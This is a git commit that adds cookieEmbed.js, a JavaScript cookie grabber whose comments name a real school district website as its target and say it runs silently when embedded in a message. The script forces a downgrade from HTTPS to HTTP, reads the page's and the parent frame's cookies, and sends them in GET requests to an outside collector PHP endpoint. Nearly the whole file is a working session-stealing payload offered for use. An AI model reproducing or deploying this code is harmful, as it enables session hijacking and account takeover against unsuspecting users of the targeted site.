03cff45fe876536e0aa8aab1dc5088fd25696db4
Stormersoul <FluffyStreusel@users.noreply.github.com>
2016-08-19 15:51:45 -0500

    Create cookieEmbed.js

---
+++ cookieEmbed.js
@@ -0,0 +1,32 @@
+// Cookie grabber for http://www.sps186.org/
+// Can be sent in message and automatically executed without user's knowledge.
+// Credit: Stormersoul
+
+if(window.location.protocol != 'http:') {
+  location.href = location.href.replace("https://", "http://");
+}
+
+var userName; // Not used/known
+var cookieValue; // document's cookies
+var ipAddress; // Does not work
+
+function grabCookie() {
+        if(window.location.protocol != 'http:') {
+          location.href = location.href.replace("https://", "http://");
+        }
+	cookieValue = document.cookie;
+}
+
+var req = null;
+    try { req = new XMLHttpRequest(); } catch(e) {}
+    if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
+    if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
+    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=*RecipientReadMessage*', false);
+    req.send(null);
+    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=' + window.parent.document.cookie, false);
+    req.send(null);
+    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=----------------------', false);
+    req.send(null);
+    // alert(req.getAllResponseHeaders());
+
+grabCookie();
